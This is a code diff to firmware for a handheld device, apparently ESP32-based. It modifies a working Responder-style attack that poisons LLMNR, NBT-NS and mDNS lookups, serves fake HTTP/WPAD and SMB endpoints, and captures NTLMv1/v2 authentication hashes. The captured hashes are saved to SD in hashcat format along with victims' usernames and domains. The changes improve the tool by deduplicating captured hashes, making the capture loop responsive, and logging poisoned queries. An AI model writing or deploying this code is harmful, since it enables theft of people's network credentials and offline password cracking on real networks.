@@ -154,6 +154,8 @@ static String utf16leToAscii(const uint8_t* d, int n) { String s; for (int i=0;i
 // Locate + parse an NTLMSSP Type-3 anywhere in a buffer (works for HTTP b64-decoded
 // data AND raw SMB session-setup frames). Writes a hashcat line; returns the user.
 static uint32_t s_caps = 0, s_capsV1 = 0;
+static String   s_seenKey[8];        // dedup: last 8 NT-response keys
+static uint8_t  s_seenN = 0;
 static void writeHash(const String& line) {
     File f = SD.open(String(SD_DIR_RESPONDER) + "/hashes.txt", FILE_APPEND);
     if (f) { f.println(line); f.close(); }
@@ -173,12 +175,18 @@ static String parseType3(const uint8_t* dec, int dl, const String& src, const ch
     if (ntOff+ntLen>(uint32_t)dl || domOff+domLen>(uint32_t)dl || usrOff+usrLen>(uint32_t)dl) return "";
     String user=utf16leToAscii(dec+usrOff,usrLen), dom=utf16leToAscii(dec+domOff,domLen);
     if (user.isEmpty()) user="(anon)"; if (dom.isEmpty()) dom="WORKGROUP";
-    String line, chal=hex(RSP_CHALLENGE,8);
+    bool v1=false; String chal=hex(RSP_CHALLENGE,8), line, key;
     if (ntLen == 24 && lmOff+lmLen<=(uint32_t)dl && lmLen==24) {   // NTLMv1 → -m 5500
-        line = user+"::"+dom+":"+hex(dec+lmOff,24)+":"+hex(dec+ntOff,24)+":"+chal; s_capsV1++;
+        v1=true; key=hex(dec+ntOff,24);
+        line = user+"::"+dom+":"+hex(dec+lmOff,24)+":"+hex(dec+ntOff,24)+":"+chal;
     } else if (ntLen >= 24) {                                       // NTLMv2 → -m 5600
-        line = user+"::"+dom+":"+chal+":"+hex(dec+ntOff,16)+":"+hex(dec+ntOff+16,ntLen-16); s_caps++;
+        key=hex(dec+ntOff,16);
+        line = user+"::"+dom+":"+chal+":"+hex(dec+ntOff,16)+":"+hex(dec+ntOff+16,ntLen-16);
     } else return "";
+    // dedup: a victim that re-auths shouldn't re-log the same hash / re-count
+    for (int i=0;i<8;i++) if (s_seenKey[i]==key) return user;
+    s_seenKey[s_seenN++ % 8]=key;
+    if (v1) s_capsV1++; else s_caps++;
     writeHash(line); logCred(proto, src, dom + "\\" + user);
     return user;
 }
@@ -250,6 +258,7 @@ void runResponder(char* args) {
     IPAddress ip = WiFi.localIP();
     for (int i=0;i<4;i++) s_ourIp[i]=ip[i];
     s_rHead=s_rTail=0; s_caps=0; s_capsV1=0;
+    for (int i=0;i<8;i++) s_seenKey[i]=""; s_seenN=0;
 
     struct udp_pcb *llmnr=nullptr,*nbt=nullptr,*mdns=nullptr;
     ip_addr_t m1,m2; IP_ADDR4(&m1,224,0,0,252); IP_ADDR4(&m2,224,0,0,251);
@@ -278,11 +287,14 @@ void runResponder(char* args) {
 
     uint32_t llmnrN=0,nbtN=0,mdnsN=0,lastDraw=0;
     char lastNames[3][40]={{0},{0},{0}}; char lastCap[52]={0}; bool stop=false;
+    File poisonLog = SD.open(String(SD_DIR_RESPONDER)+"/poison.csv", FILE_APPEND);   // kept open (STA sockets = GDMA-safe)
 
     auto handleHttp=[&](WiFiClient& cl){
+        cl.setTimeout(250);   // bound each blocking read so [q] stays responsive
         String auth, path; bool isWpad=false;
         uint32_t t0=millis();
         while (cl.connected() && millis()-t0<1500) {
+            if (inputHandler.getKeyboardInput()=='q') { stop=true; cl.stop(); return; }
             String ln=cl.readStringUntil('\n');
             if (ln.length()<=1) break;
             if (ln.startsWith("GET ")||ln.startsWith("POST ")) { path=ln; if (ln.indexOf("wpad")>=0) isWpad=true; }
@@ -321,8 +333,10 @@ void runResponder(char* args) {
     };
 
     auto handleSmb=[&](WiFiClient& cl){
+        cl.setTimeout(250);   // bound each blocking read so [q] stays responsive
         uint32_t t0=millis(); uint64_t sess=0x1234000000000000ULL;
         while (cl.connected() && millis()-t0<2500) {
+            if (inputHandler.getKeyboardInput()=='q') { stop=true; cl.stop(); return; }
             if (cl.available()<4) { delay(5); continue; }
             uint8_t nb[4]; cl.readBytes(nb,4);
             int mlen=(nb[1]<<16)|(nb[2]<<8)|nb[3];
@@ -359,8 +373,7 @@ void runResponder(char* args) {
             memmove(lastNames[0],lastNames[1],40); memmove(lastNames[1],lastNames[2],40);
             snprintf(lastNames[2],40,"%s  %s",pn,e.name);
             IPAddress s(e.src);
-            File pf=SD.open(String(SD_DIR_RESPONDER)+"/poison.csv",FILE_APPEND);
-            if (pf){ pf.printf("%lu,%s,%s,%s\n",(unsigned long)millis(),pn,s.toString().c_str(),e.name); pf.close(); }
+            if (poisonLog) poisonLog.printf("%lu,%s,%s,%s\n",(unsigned long)millis(),pn,s.toString().c_str(),e.name);
         }
         WiFiClient hc=http.available(); if (hc) handleHttp(hc);
         WiFiClient sc=smb.available();  if (sc) handleSmb(sc);
@@ -378,11 +391,13 @@ void runResponder(char* args) {
             dm.fillRect(10,capY,SCREEN_WIDTH-20,14,TFT_BLACK); dm.setCursor(10,capY);
             if (lastCap[0]) { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ")+lastCap); }
             else            { dm.setTextColor(0x5AEB);     dm.printText("waiting for auth (HTTP/SMB)..."); }
+            if (poisonLog) poisonLog.flush();   // persist queued rows periodically
         }
         if (inputHandler.getKeyboardInput()=='q') stop=true;
         delay(8);
     }
 
+    if (poisonLog) poisonLog.close();
     http.stop(); smb.stop();
     LOCK_TCPIP_CORE();
     if (llmnr){ igmp_leavegroup(IP4_ADDR_ANY4,ip_2_ip4(&m1)); udp_remove(llmnr);}
